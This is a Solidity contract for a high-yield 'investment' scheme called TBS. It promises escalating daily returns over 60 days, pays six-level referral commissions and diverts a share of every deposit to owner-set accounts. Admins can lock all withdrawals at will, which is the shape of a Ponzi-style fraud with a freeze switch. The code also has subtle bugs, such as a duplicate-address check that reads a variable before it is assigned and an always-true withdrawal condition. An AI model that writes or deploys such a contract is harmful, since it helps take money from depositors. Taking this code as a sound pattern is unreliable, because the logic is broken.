pragma solidity ^0.4.23;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        uint256 reinvestAmount;
        bool isExpired;
    }

    struct Plan {
        uint256 id;
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        bool isActive;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256[] levelRefCounts;
        uint256[] levelRefInvestments;
    }
}

contract Managable {
    address public owner;
    mapping(address => uint256) public admins;
    bool public locked = false;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }

    modifier onlyAdmin() {
        require(msg.sender == owner || admins[msg.sender] == 1);
        _;
    }

    function addAdminAccount(address _newAdminAccount, uint256 _status) public onlyOwner {
        require(_newAdminAccount != address(0));
        admins[_newAdminAccount] = _status;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not locked.
     */
    modifier isNotLocked() {
        require(!locked);
        _;
    }

    /**
     * @dev called by the owner to set lock state, triggers stop/continue state
     */
    function setLock(bool _value) onlyAdmin public {
        locked = _value;
    }
}

contract TBS is Managable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 40; //per thousand
    uint256 public constant MARKETING_RATE = 20;
    uint256 public constant DIVIDENDSPOOL_RATE = 20;
    uint256 public constant REFERENCE_RATE = 70;
    uint256 public constant REFERENCE_LEVEL1_RATE = 40;
    uint256 public constant REFERENCE_LEVEL2_RATE = 20;
    uint256 public constant REFERENCE_LEVEL3_RATE = 5;
    uint256 public constant REFERENCE_SELF_RATE = 5;
    uint256 public constant INVEST_DAILY_BASE_RATE = 18;
    uint256 public constant REINVEST_DAILY_BASE_RATE = 30;
    uint256 public constant MAX_DAILY_RATE = 48;
    uint256 public constant CHANGE_INTERVAL = 6;
    uint256 public constant MINIMUM = 10000000; //minimum investment needed
    uint256 public constant REFERRER_CODE = 6666; //default

    uint256 private constant DAY = 24 * 60 * 60; //seconds

    uint256 public startDate;
    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address private developerAccount_;
    address private marketingAccount_;
    address private referenceAccount_;
    address private dividendsAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address indexed investor, uint256 amount);
    event onGrant(address indexed grantor, address beneficiary, uint256 amount);
    event onWithdraw(address indexed investor, uint256 amount);
    event onReinvest(address indexed investor, uint256 amount);

    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        dividendsAccount_ = msg.sender;
        startDate = block.timestamp;
        _init();
    }

    function() external payable {
        //do nothing;
    }

    function checkIn() public {
    }

    function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyAdmin returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyAdmin returns (address) {
        return developerAccount_;
    }


    function setDividendsAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        dividendsAccount_ = _newDeveloperAccount;
    }

    function getDividendsAccount() public view onlyAdmin returns (address) {
        return dividendsAccount_;
    }


    function setReferenceAccount(address _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyAdmin returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].levelRefCounts = new uint256[](6);
        uid2Investor[latestReferrerCode].levelRefInvestments = new uint256[](6);
        investmentPlans_.push(Objects.Plan(0, 22, 60 * DAY, true));
        //invest 60 days
        investmentPlans_.push(Objects.Plan(1, 34, 60 * DAY, true));
        //reinvest 60 days
    }

    function getCurrentPlans() public onlyAdmin view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        bool[] memory actives = new bool[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
            actives[i] = plan.isActive;
        }
        return
        (
        ids,
        interests,
        terms,
        actives
        );
    }

    function getTotalInvestments() public onlyAdmin view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getReferInfoByUID(uint256 _uid) public onlyAdmin view returns (uint256[] memory, uint256[] memory) {
        Objects.Investor storage investor = uid2Investor[_uid];
        return
        (
        investor.levelRefCounts,
        investor.levelRefInvestments
        );
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner && admins[msg.sender] != 1) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        investor.levelRefCounts[0],
        investor.levelRefCounts[1],
        investor.levelRefCounts[2],
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner && admins[msg.sender] != 1) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory lastWithdrawalDates = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            planIds[i] = investor.plans[i].planId;
            lastWithdrawalDates[i] = investor.plans[i].lastWithdrawalDate;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        lastWithdrawalDates,
        isExpireds
        );
    }

    function importInvestor(address _addr, uint256 _uid, uint256 _referrerCode) public onlyAdmin returns (bool) {
        require(_uid >= REFERRER_CODE, "wrong uid");
        address addr = _addr;
        if (_uid > latestReferrerCode) {
            latestReferrerCode = _uid;
        }
        if (address2UID[addr] == 0) {
            address2UID[addr] = _uid;
            uid2Investor[_uid].addr = addr;
            uid2Investor[_uid].referrer = _referrerCode;
            uid2Investor[_uid].planCount = 0;
            uid2Investor[_uid].levelRefCounts = new uint256[](6);
            uid2Investor[_uid].levelRefInvestments = new uint256[](6);


            if (_referrerCode >= REFERRER_CODE) {
                uint256 _ref1 = _referrerCode;
                uint256 _ref2 = uid2Investor[_ref1].referrer;
                uint256 _ref3 = uid2Investor[_ref2].referrer;
                uint256 _ref4 = uid2Investor[_ref3].referrer;
                uint256 _ref5 = uid2Investor[_ref4].referrer;
                uint256 _ref6 = uid2Investor[_ref5].referrer;

                uid2Investor[_ref1].levelRefCounts[0] = uid2Investor[_ref1].levelRefCounts[0].add(1);
                if (_ref2 >= REFERRER_CODE) {
                    uid2Investor[_ref2].levelRefCounts[1] = uid2Investor[_ref2].levelRefCounts[1].add(1);
                }
                if (_ref3 >= REFERRER_CODE) {
                    uid2Investor[_ref3].levelRefCounts[2] = uid2Investor[_ref3].levelRefCounts[2].add(1);
                }
                if (_ref4 >= REFERRER_CODE) {
                    uid2Investor[_ref4].levelRefCounts[3] = uid2Investor[_ref4].levelRefCounts[3].add(1);
                }
                if (_ref5 >= REFERRER_CODE) {
                    uid2Investor[_ref5].levelRefCounts[4] = uid2Investor[_ref5].levelRefCounts[4].add(1);
                }
                if (_ref6 >= REFERRER_CODE) {
                    uid2Investor[_ref6].levelRefCounts[5] = uid2Investor[_ref6].levelRefCounts[5].add(1);
                }
            }
        }
        return true;
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        require(address2UID[addr] == 0, "address is existing");
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].levelRefCounts = new uint256[](6);
        uid2Investor[latestReferrerCode].levelRefInvestments = new uint256[](6);
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;

            uid2Investor[_ref1].levelRefCounts[0] = uid2Investor[_ref1].levelRefCounts[0].add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].levelRefCounts[1] = uid2Investor[_ref2].levelRefCounts[1].add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].levelRefCounts[2] = uid2Investor[_ref3].levelRefCounts[2].add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].levelRefCounts[3] = uid2Investor[_ref4].levelRefCounts[3].add(1);
            }
            if (_ref5 >= REFERRER_CODE) {
                uid2Investor[_ref5].levelRefCounts[4] = uid2Investor[_ref5].levelRefCounts[4].add(1);
            }
            if (_ref6 >= REFERRER_CODE) {
                uid2Investor[_ref6].levelRefCounts[5] = uid2Investor[_ref6].levelRefCounts[5].add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private isNotLocked returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        }
        uint256 planCount = uid2Investor[uid].planCount;
        require(planCount <= 200,"planCount is too bigger");
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(uid, _amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);

        uint256 dividendspoolPercentage = (_amount.mul(DIVIDENDSPOOL_RATE)).div(1000);
        dividendsAccount_.transfer(dividendspoolPercentage);

        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        return true;
    }

    function grant(address _addr) public payable {

        uint256 grantorUid = address2UID[msg.sender];
        bool isAutoAddReferrer = true;
        uint256 referrerCode = 0;

        if (grantorUid != 0 && isAutoAddReferrer) {
            referrerCode = grantorUid;
        }

        if (_invest(_addr, 0, referrerCode, msg.value)) {
            emit onGrant(msg.sender, _addr, msg.value);
        }
    }

    function invest(uint256 _referrerCode) public payable {

        if (_invest(msg.sender, 0, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value

            );
        }
    }

    function _withdraw(bool isUpdate) private isNotLocked returns (uint256) {
        require(msg.value == 0, "wrong trx amount");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment, uid2Investor[uid].plans[i].reinvestAmount, uid2Investor[uid].plans[i].planId, withdrawalDate, uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;
            if (isUpdate) {
                uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
                uid2Investor[uid].plans[i].reinvestAmount = 0;
            } else {
                uid2Investor[uid].plans[i].reinvestAmount += amount;
            }
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor[uid].availableReferrerEarnings > 0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }
        return withdrawalAmount;
    }

    function withdraw() public {
        uint256 withdrawalAmount = _withdraw(true);
        if (withdrawalAmount >= 0) {
            msg.sender.transfer(withdrawalAmount);
            emit onWithdraw(msg.sender, withdrawalAmount);
        }
    }

    function reinvest(uint256 _planId) public {
        uint256 withdrawalAmount = _withdraw(false);
        require(address(this).balance >= withdrawalAmount);
        if (withdrawalAmount >= 0) {
            if (_invest(msg.sender, _planId, 1, withdrawalAmount)) {//existing user, _referrerCode is useless, just pass 0
                emit onReinvest(msg.sender, withdrawalAmount);
            }
        }
    }

    function _calculateDividends(uint256 _amount, uint256 _reinvestAmount, uint256 _planId, uint256 _now, uint256 _start) private view returns (uint256) {
        require(_start > startDate);

        uint256 dif = _now.sub(_start);
        uint256 div = 0;
        if (_planId == 0) {
            if (dif > 60 * DAY) {
                dif = 60 * DAY;
            }
            if (dif >= 45 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) +
                15 * (INVEST_DAILY_BASE_RATE + 4 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 45 * DAY) * (INVEST_DAILY_BASE_RATE + 5 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 30 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 30 * DAY) * (INVEST_DAILY_BASE_RATE + 4 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 20 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 20 * DAY) * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 10 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 10 * DAY) * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 5 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE) / 1000 +
                _amount * (dif - 5 * DAY) * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif < 5 * DAY) {
                div = _amount *
                (dif * INVEST_DAILY_BASE_RATE) / DAY
                / 1000;
            }
        } else if (_planId == 1) {
            if (dif > 60 * DAY) {
                dif = 60 * DAY;
            }
            if (dif >= 30 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE +
                10 * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (REINVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                (dif - 30 * DAY) * (REINVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) / DAY)
                / 1000;
            } else if (dif >= 20 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE +
                10 * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 20 * DAY) * (REINVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 10 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE) / 1000 +
                _amount * (dif - 10 * DAY) * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif < 10 * DAY) {
                div = _amount *
                (dif * REINVEST_DAILY_BASE_RATE) / DAY
                / 1000;
            }
        }
        return div.sub(_reinvestAmount);
    }

    function _calculateReferrerReward(uint256 _uid, uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;

            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);

                _refAmount = (_investment.mul(REFERENCE_SELF_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_uid].availableReferrerEarnings = _refAmount.add(uid2Investor[_uid].availableReferrerEarnings);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
            }

            if (_ref1 != 0) {
                uid2Investor[_ref1].levelRefInvestments[0] = _investment.add(uid2Investor[_ref1].levelRefInvestments[0]);
            }
            if (_ref2 != 0) {
                uid2Investor[_ref2].levelRefInvestments[1] = _investment.add(uid2Investor[_ref2].levelRefInvestments[1]);
            }
            if (_ref3 != 0) {
                uid2Investor[_ref3].levelRefInvestments[2] = _investment.add(uid2Investor[_ref3].levelRefInvestments[2]);
            }
            if (_ref4 != 0) {
                uid2Investor[_ref4].levelRefInvestments[3] = _investment.add(uid2Investor[_ref4].levelRefInvestments[3]);
            }
            if (_ref5 != 0) {
                uid2Investor[_ref5].levelRefInvestments[4] = _investment.add(uid2Investor[_ref5].levelRefInvestments[4]);
            }
            if (_ref6 != 0) {
                uid2Investor[_ref6].levelRefInvestments[5] = _investment.add(uid2Investor[_ref6].levelRefInvestments[5]);
            }

        }

        if (_allReferrerAmount > 0) {
            referenceAccount_.transfer(_allReferrerAmount);
        }
    }

}
